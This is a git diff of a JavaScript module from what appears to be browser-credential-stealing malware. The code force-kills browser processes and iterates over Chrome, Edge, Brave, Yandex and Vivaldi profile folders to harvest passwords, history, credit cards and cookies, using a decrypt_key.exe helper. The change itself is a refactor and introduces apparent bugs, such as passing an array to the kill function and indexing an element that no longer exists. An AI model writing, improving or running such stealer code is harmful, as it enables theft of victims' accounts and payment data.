@@ -5,16 +5,7 @@ const { execSync, exec } = require('child_process');
 const { tempFolder } = require('../index');
 const { addDoubleQuotes } = require('../util/string');
 const { sleep } = require('../util/general');
-const { localAppData } = require('../util/variables');
-
-const browsers = [
-  ['',       ['Vivaldi']],
-  ['chrome', ['Google', 'Chrome SxS']],
-  ['chrome', ['Google', 'Chrome']],
-  ['msedge', ['Microsoft', 'Edge']],
-  ['',       ['Yandex', 'YandexBrowser']],
-  ['brave',  ['BraveSoftware', 'Brave-Browser']],
-];
+const { browsers, browsersProcesses } = require('../util/variables');
 
 const filesToDelete = [];
 const toolPath = addDoubleQuotes(join(tempFolder, 'decrypt_key.exe'));
@@ -81,22 +72,22 @@ const cookies = (name, path, profile) => {
 
 const fns = { passwords, history, creditCards, cookies };
 
-const kill = (browser, onKilled) => {
-  const tasks = execSync('tasklist');
-  if (tasks.includes(browser)) {
-    exec(`taskkill /f /im ${browser}.exe`).on('exit', () => onKilled());
-  } else {
-    onKilled();
-  }
+const kill = (browser) => {
+  return new Promise((resolve, reject) => {
+    const tasks = execSync('tasklist');
+    if (tasks.includes(browser)) {
+      exec(`taskkill /f /im ${browser}.exe`).on('exit', resolve);
+    } else {
+      reject();
+    }
+  });
 };
 
 if (!existsSync(join(tempFolder, 'Browsers'))) mkdirSync(join(tempFolder, 'Browsers'));
-browsers.forEach((browser) => {
-  const path = resolve(localAppData, browser[1].join(sep), 'User Data');
-  // Browser data exists
-  if (existsSync(path)) {
-    // Kill browser process
-    kill(browser[0], () => {
+kill(browsersProcesses).then(() => {
+  browsers.forEach(async (browser) => {
+    const path = resolve(process.env.LOCALAPPDATA, browser.join(sep), 'User Data');
+    if (existsSync(path)) {
       ['passwords', 'history', 'creditCards', 'cookies']
         .forEach(fn => {
           ['Default', 'Profile 1', 'Profile 2', 'Profile 3', 'Profile 4', 'Profile 5']
@@ -104,8 +95,8 @@ browsers.forEach((browser) => {
               fns[fn](browser[1].join(' '), path, profile);
             });
         });
-    });
-  }
+    }
+  });
 });
 
 process.on('exit', () => {
